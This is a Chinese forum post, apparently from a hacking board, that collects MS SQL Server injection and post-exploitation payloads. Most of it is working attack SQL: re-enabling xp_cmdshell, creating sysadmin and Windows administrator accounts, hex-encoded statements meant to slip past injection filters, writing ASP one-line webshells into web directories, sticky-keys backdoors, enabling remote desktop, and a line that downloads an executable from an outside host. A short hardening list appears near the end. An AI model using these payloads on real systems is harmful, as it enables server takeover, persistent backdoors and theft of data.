@@ -1,0 +1,446 @@
+D0000D发往论坛板块-------------------------------------------------------
+No2  号板块  技术文章
+D8888D贴子标题-------------------------------------------------------
+SQL高级注入使用之储存过程
+D8888D主贴内容-------------------------------------------------------
+收藏很久了 不过看到很多朋友没有就放出来啦~~~
+出来新的方法 欢迎大家补充。。。
+
+
+本帖隐藏的内容需要回复才可以浏览
+sql2005恢复xp_cmdshell
+EXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell', 1;RECONFIGURE;
+关闭:EXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell', 1;RECONFIGURE;
+零、
+---------------
+-- 添加SA用户--
+---------------
+&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&
+1、exec master.dbo.sp_addlogin system;
+2、exec master.dbo.sp_addlogin system,system;
+3、exec master.dbo.sp_addsrvrolemember itpro,sysadmin
+
+&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&
+防注入 sa:itpro pass:itpro
+declare @s varchar(4000) set @s=cast(0x65786563206d61737465722e64626f2e73705f6164646c6f67696e20697470726f as varchar(4000));exec(@s); declare @c varchar(4000) set @c=cast(0x65786563206d61737465722e64626f2e73705f70617373776f7264206e756c6c2c697470726f2c697470726f as varchar(4000));exec(@c); declare @a varchar(4000) set @a=cast(0x65786563206d61737465722e64626f2e73705f616464737276726f6c656d656d6265722027697470726f272c2073797361646d696e as varchar(4000));exec(@a);-- and 1=1
+
+防注入 sa:system pass:system
+declare @s varchar(4000) set @s=cast(0x65786563206d61737465722e64626f2e73705f6164646c6f67696e2073797374656d2c73797374656d as varchar(4000));exec(@s);declare @a varchar(4000) set @a=cast(0x65786563206d61737465722e64626f2e73705f616464737276726f6c656d656d626572202773797374656d272c2073797361646d696e as varchar(4000));exec(@a);-- and 1=1
+一、
+--------------
+-恢复存储过程-
+--------------
+&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&
+use master
+exec sp_addextendedproc xp_cmdshell,'xp_cmdshell.dll'
+exec sp_dropextendedproc "xp_cmdshell"
+exec sp_addextendedproc 'xp_cmdshell', 'xpsql70.dll'
+exec sp_dropextendedproc 'xp_cmdshell'
+exec sp_addextendedproc 'xp_cmdshell','xpweb70.dll'
+exec sp_addextendedproc xp_dirtree,'xpstar.dll'
+exec sp_addextendedproc xp_enumgroups,'xplog70.dll'
+exec sp_addextendedproc xp_fixeddrives,'xpstar.dll'
+exec sp_addextendedproc xp_loginconfig,'xplog70.dll'
+exec sp_addextendedproc xp_enumerrorlogs,'xpstar.dll'
+exec sp_addextendedproc xp_getfiledetails,'xpstar.dll'
+exec sp_addextendedproc sp_OACreate,'odsole70.dll'
+exec sp_addextendedproc sp_OADestroy,'odsole70.dll'
+exec sp_addextendedproc sp_OAGetErrorInfo,'odsole70.dll'
+exec sp_addextendedproc sp_OAGetProperty,'odsole70.dll'
+exec sp_addextendedproc sp_OAMethod,'odsole70.dll'
+exec sp_addextendedproc sp_OASetProperty,'odsole70.dll'
+exec sp_addextendedproc sp_OAStop,'odsole70.dll'
+exec sp_addextendedproc xp_regaddmultistring,'xpstar.dll'
+exec sp_addextendedproc xp_regdeletekey,'xpstar.dll'
+exec sp_addextendedproc xp_regdeletevalue,'xpstar.dll'
+exec sp_addextendedproc xp_regenumvalues,'xpstar.dll'
+exec sp_addextendedproc xp_regread,'xpstar.dll'
+exec sp_addextendedproc xp_regremovemultistring,'xpstar.dll'
+exec sp_addextendedproc xp_regwrite,'xpstar.dll'
+exec sp_addextendedproc xp_availablemedia,'xpstar.dll'
+&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&
+恢复cmdshell防注入
+============================================================
+declare @a varchar(255),@b varchar(255),@c varchar(255);
+set @a=0x6D61737465722E2E73705F616464657874656E64656470726F63;
+set @b=0x78705F636D647368656C6C;
+set @c=0x78706C6F6737302E646C6C;
+exec @a @b,@c
+============================================================
+
+二、
+
+----------------------------------
+--恢复sp_addextendedproc存储过程--
+----------------------------------
+&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&
+create procedure sp_addextendedproc --- 1996/08/30 20:13
+@functname nvarchar(517),/* (owner.)name of function to call */ @dllname varchar(255)/* name of DLL containing function */ as
+set implicit_transactions off
+if @@trancount > 0
+begin
+raiserror(15002,-1,-1,'sp_addextendedproc')
+return (1)
+end
+dbcc addextendedproc( @functname, @dllname)
+return (0) -- sp_addextendedproc
+GO
+&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&
+
+三、
+--------------------------
+--使用存储过程加管理方法--
+--------------------------
+&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&
+1、master.dbo.xp_cmdshell 'net user itpro gmasfm && net localgroup administrators itpro /add'
+2、EXEC sp_resolve_logins 'text', 'e:\asp\"&net user admina admin /add&net localgroup administrators admina /add&dir "e:\asp', '1.asp'
+3、DECLARE @shell INT EXEC SP_OAcreate 'wscript.shell',@shell OUTPUT EXEC SP_OAMETHOD 
+@shell,'run',null, 'C:\WINdows\system32\cmd.exe /c net user sadfish fish /add'
+&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&
+
+四、
+-------------------------
+-- 导出文件的存储过程  --
+-------------------------
+&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&
+DECLARE @shell INT EXEC SP_OAcreate 'wscript.shell',@shell OUTPUT EXEC SP_OAMETHOD @shell,'run',null, 'C:\WINdows\system32\cmd.exe /c netstat -an >c:\1.txt'
+&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&
+
+五、
+---------------------------
+--  读取文件的存储过程   --
+---------------------------
+&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&
+declare @o int, @f int, @t int, @ret int
+declare @line varchar(8000)
+exec sp_oacreate 'scripting.filesystemobject', @o out
+exec sp_oamethod @o, 'opentextfile', @f out, 'c:\1.txt', 1
+exec @ret = sp_oamethod @f, 'readline', @line out
+while( @ret = 0 )
+begin
+print @line
+exec @ret = sp_oamethod @f, 'readline', @line out
+end
+&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&
+
+六、
+
+----------------------
+-----写一句话木马-----
+----------------------
+&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&
+declare @o int, @f int, @t int, @ret int
+exec sp_oacreate 'scripting.filesystemobject', @o out
+exec sp_oamethod @o, 'createtextfile', @f out, 'c:\Inetpub\tianhong\2.asp', 1
+exec @ret = sp_oamethod @f, 'writeline', NULL,
+'<%execute(request("a"))%>'     ' ' 单引号为要写的内容
+<%25 if request("x")<>"" then execute(request("x"))%25>
+&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&
+
+防注入写入法
+================================================================
+declare @a int,@b int,@c varchar(255),@d varchar(255),@e varchar(255),@f varchar(255),@g varchar(255),@h varchar(255),@i varchar(255),@j varchar(255);
+set @c=0x6D61737465722E2E73705F6F61637265617465;
+set @d=0x6D61737465722E2E73705F6F616D6574686F64;
+set @e=0x536372697074696E672E46696C6573797374656D4F626A656374;
+set @f=0x4372656174655465787446696C65;
+set @g=0x433A5C496E65747075625C73797374656D2E617370;
+set @h=0x74727565;
+set @i=0x7772697465;
+set @j=0x3C256576616C20726571756573742822582229253E;
+exec @c @e,@a output;
+exec @d @a,@f,@b output,@g,@h;
+exec @d @b,@i,null,@j
+==================================================================
+
+七、
+----------------------
+-----写一句话木马-----
+----------------------
+xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
+declare @s nvarchar(4000);select @s=0x730065006c00650063007400200027003c00250045007800650063007500740065002800720065007100750065007300740028002200610022002900290025003e000d000a002700;exec sp_makewebtask 0x43003a005c007a00770065006c006c002e00610073007000, @s;-- and% 1=1
+在上面一样;exec%20sp_makewebtask%20'd:\zjkdj\zjkdj\zjkds\bake.asp,'%20select%20''<%25execute(request("a"))%25>''%20';--
+xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
+
+八、
+----------------------
+---SA沙盒模式提权-----
+----------------------
+&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&
+1、exec master..xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Jet\4.0\Engines','SandBoxMode','REG_DWORD',0;--
+
+2、Select * From OpenRowSet('Microsoft.Jet.OLEDB.4.0',';Database=c:\windows\system32\ias\ias.mdb','select shell("net user itpro gmasfm /add")');
+&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&
+
+九、
+--------------------
+-----另类SA提权-----
+--------------------
+xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
+2、declare @oo int
+exec sp_oacreate 'scripting.filesystemobject', @oo out 
+exec sp_oamethod @oo, 'copyfile',null,'c:\windows\system32\sethc.exe' ,'c:\windows\system32\dllcache\sethc.exe';
+1、declare @o int
+exec sp_oacreate 'scripting.filesystemobject', @o out 
+exec sp_oamethod @o, 'copyfile',null,'c:\windows\explorer.exe' ,'c:\windows\system32\sethc.exe';
+
+DECLARE @o int
+DECLARE @z int
+EXEC sp_OACreate 'Shell.Users',@o OUT
+EXEC sp_OAMethod @o, 'Create', @z OUT, 'test'
+EXEC sp_OASetProperty  @z, 'setting', 3 , 'AccountType'
+EXEC sp_OAMethod @z, 'ChangePassword',NULL , '123456', ''
+xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
+
+十、
+--------------
+--导出注册表--
+--------------
+xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
+1、drop table [regdir];create table [regdir](value nvarchar(1000) null,data nvarchar(1000) null)--
+
+2、delete [regdir];insert [regdir]exec master..xp_regread 'HKEY_LOCAL_MACHINE','SYSTEM\RAdmin\v2.0\Server\Parameters','port'
+
+xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
+
+十一、
+
+----------------
+---下载程序-----
+----------------
+xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
+1、declare @b varbinary(8000),@hr int,@http int,@down int exec sp_oacreate [microsoft.xmlhttp],@http output exec @hr = sp_oamethod @http,[open],null,[get],[[url=http://192.168.1.6:800/wwwroot.rar]链接标记http://192.168.1.6:800/wwwroot.rar[/url]],0 exec @hr = sp_oamethod @http,[send],null exec @hr=sp_oagetproperty @http,[responsebody],@b output exec @hr=sp_oacreate [adodb.stream],@down output exec @hr=sp_oasetproperty @down,[type],1 exec @hr=sp_oasetproperty @down,[mode],3 exec @hr=sp_oamethod @down,[open],null exec @hr=sp_oamethod @down,[write],null,@b exec @hr=sp_oamethod @down,[savetofile],null,[c:/a.exe],1 ;-- and 1=1
+
+xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
+
+十二、
+
+-----------------
+-Log备份WebShell-
+-----------------
+xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
+alter database master set RECOVERY FULL
+create table cmd (a image)--
+backup log master to disk = 'c:\cmd' with init
+insert into cmd (a) values ('<%eval(request("a")):response.end%>')--
+backup log master to disk = 'C:\Inetpub\wwwroot\ri3.asp'--
+drop table cmd--
+2\
+
+use mir
+alter database mir set RECOVERY FULL --
+create table cmd8 (a image)--
+backup log mir to disk = 'c:\cmd8' with init --
+insert into cmd8 (a) values ('<%eval(request("a")):response.end%>')--
+backup log mir to disk = 'c:\backup.asp'--
+drop table cmd8--
+alter database mir set RECOVERY SIMPLE --
+3\
+create/**/table/**/[dbo].[shit_tmp]/**/([cmd]/**/[image])--
+declare/**/@a/**/sysname,@s/**/nvarchar(4000)/**/select/**/@a=db_name(),@s=0x6C0061006F007A0068006F007500/**/backup/**/log/**/@a/**/to/**/disk/**/=/**/@s/**/with/**/init,no_truncate--
+insert/**/into/**/[shit_tmp](cmd)/**/values(0x3C256576616C28726571756573742822612229293A726573706F6E73652E656E64253E)--
+select/**/@s=0x63003a005c0031002e00610073007000/**/backup/**/log/**/@a/**/to/**/disk=@s/**/with/**/init,no_truncate--
+Drop/**/table/**/[shit_tmp]--
+xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
+
+十三、
+-------------------------------
+--创建sp_readtextfile存储过程--
+-------------------------------
+xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
+Create proc sp_readTextFile @filename sysname
+as
+
+  begin
+  set nocount on
+  Create table #tempfile (line varchar(8000))
+  exec ('bulk insert #tempfile from "' + @filename + '"')
+  select * from #tempfile
+  drop table #tempfile
+End
+go
+
+xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
+
+十四、开3389
+===================================================================
+declare @a varchar(255),@b varchar(255); set @a=0x6D61737465722E64626F2E78705F636D647368656C6C; set @b=0x636D64202F6320776D6963205244544F47474C45205748455245205365727665724E616D653D2725434F4D50555445524E414D4525272063616C6C20536574416C6C6F775453436F6E6E656374696F6E732031; exec @a @b
+===================================================================
+
+
+
+
+我记得2003的web目录是写在C:\WINDOWS\system32\inetsrv\MetaBase.xml
+-----------------
+---读取文件内容--
+-----------------
+exec sp_readTextFile 'c:\boot.ini'
+
+
+xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File  Execution Options\sethc.exe','debugger','reg_sz','c:\windows\system32\cmd.exe'
+
+
+-----------------------
+---清除MsSql日志-------
+-----------------------
+xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
+set nocount on 
+declare @logicalfilename sysname,
+@maxminutes int,
+@newsize int
+xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
+
+----------------------
+--停掉或激活某个服务--
+----------------------
+exec master..xp_servicecontrol 'stop','sharedaccess'
+exec master..xp_servicecontrol 'start','sharedaccess'
+
+--------------------
+--列出驱动器的名称--
+--------------------
+
+EXEC [master].[dbo].[xp_availablemedia]
+
+----------------------------------
+--列出指定目录的所有下一级子目录--
+----------------------------------
+
+EXEC [master].[dbo].[xp_subdirs] 'c:\windows'
+
+------------------------------
+--列出当前错误日志的具体内容--
+------------------------------
+
+EXEC [master].[dbo].[xp_readerrorlog]
+
+----------------------
+--列出当前计算机名称--
+----------------------
+
+execute master..xp_getnetname
+
+--------------------------------
+-列出当前计算机的驱动器可用空间-
+--------------------------------
+
+execute master..xp_fixeddrives
+
+========================
+==列出服务器所有本地组==
+========================
+
+execute master..xp_enumgroups
+
+======================
+==获取MS SQL的版本号==
+======================
+
+execute master..sp_msgetversion
+
+=========================================
+==参数说明:目录名,目录深度,是否显示文件==
+========================================= 
+
+execute master..xp_dirtree 'c:' 
+execute master..xp_dirtree 'c:',1 
+execute master..xp_dirtree 'c:',1,1
+
+=========================================
+==列出服务器上安装的所有OLEDB提供的程序==
+=========================================
+
+execute master..xp_enum_oledb_providers
+
+=========================
+==列出服务器上配置的DNS==
+=========================
+
+execute master..xp_enumdsn 
+
+删除存储过程 
+
+drop PROCEDURE sp_addextendedproc
+
+
+-----------------------
+--删除sql危险存储过程--
+-----------------------
+
+xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
+DROP PROCEDURE sp_makewebtask
+exec master..sp_dropextendedproc xp_cmdshell
+exec master..sp_dropextendedproc xp_dirtree
+exec master..sp_dropextendedproc xp_fileexist
+exec master..sp_dropextendedproc xp_terminate_process
+exec master..sp_dropextendedproc sp_oamethod
+exec master..sp_dropextendedproc sp_oacreate
+exec master..sp_dropextendedproc xp_regaddmultistring
+exec master..sp_dropextendedproc xp_regdeletekey
+exec master..sp_dropextendedproc xp_regdeletevalue
+exec master..sp_dropextendedproc xp_regenumkeys
+exec master..sp_dropextendedproc xp_regenumvalues
+exec master..sp_dropextendedproc sp_add_job
+exec master..sp_dropextendedproc sp_addtask
+exec master..sp_dropextendedproc xp_regread
+exec master..sp_dropextendedproc xp_regwrite
+exec master..sp_dropextendedproc xp_readwebtask
+exec master..sp_dropextendedproc xp_makewebtask
+exec master..sp_dropextendedproc xp_regremovemultistring
+exec master..sp_dropextendedproc sp_OACreate
+DROP PROCEDURE sp_addextendedproc
+xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
+xp_cmdshell新的恢复办法
+
+扩展储存过程被删除以后可以有很简单的办法恢复：
+删除
+drop procedure sp_addextendedproc
+drop procedure sp_oacreate
+exec sp_dropextendedproc 'xp_cmdshell'
+
+恢复
+dbcc addextendedproc ("sp_oacreate","odsole70.dll")
+dbcc addextendedproc ("xp_cmdshell","xplog70.dll")
+
+这样可以直接恢复，不用去管sp_addextendedproc是不是存在
+
+-----------------------------
+
+删除扩展存储过过程xp_cmdshell的语句:
+exec sp_dropextendedproc 'xp_cmdshell'
+
+恢复cmdshell的sql语句
+exec sp_addextendedproc xp_cmdshell ,@dllname ='xplog70.dll'
+
+
+开启cmdshell的sql语句
+
+exec sp_addextendedproc xp_cmdshell ,@dllname ='xplog70.dll'
+
+判断存储扩展是否存在
+select count(*) from master.dbo.sysobjects where xtype='x' and name='xp_cmdshell'
+返回结果为1就ok
+
+恢复xp_cmdshell
+exec master.dbo.addextendedproc 'xp_cmdshell','xplog70.dll';select count(*) from master.dbo.sysobjects where xtype='x' and name='xp_cmdshell'
+返回结果为1就ok
+
+否则上传xplog7.0.dll
+exec master.dbo.addextendedproc 'xp_cmdshell','c:\winnt\system32\xplog70.dll'
+
+堵上cmdshell的sql语句
+sp_dropextendedproc "xp_cmdshell 
+
+读3389端口
+regedit /e port.reg "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp"
+然后 type port.reg | find "PortNumber" 
+sql 语句
+exec master..xp_regread 'HKEY_LOCAL_MACHINE','SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp','PortNumber'
+declare @s varchar(4000) set @s=cast(0x65786563206D61737465722E2E78705F726567726561642027484B45595F4C4F43414C5F4D414348494E45272C2753595354454D5C43757272656E74436F6E74726F6C5365745C436F6E74726F6C5C5465726D696E616C205365727665725C57696E53746174696F6E735C5244502D546370272C27506F72744E756D62657227 as varchar(4000));exec(@s); --
+
+
+开启2003的终端(sa)
+xp_regwrite 'HKEY_LOCAL_MACHINE', 'SYSTEM\CurrentControlSet\Control\Terminal Server', 'fDenyTSConnections','REG_DWORD','0'
+
+exec master.dbo.xp_regwrite'HKEY_LOCAL_MACHINE','SYSTEM\CurrentControlSet\Control\Terminal Server','fDenyTSConnections','REG_DWORD',0;--
+
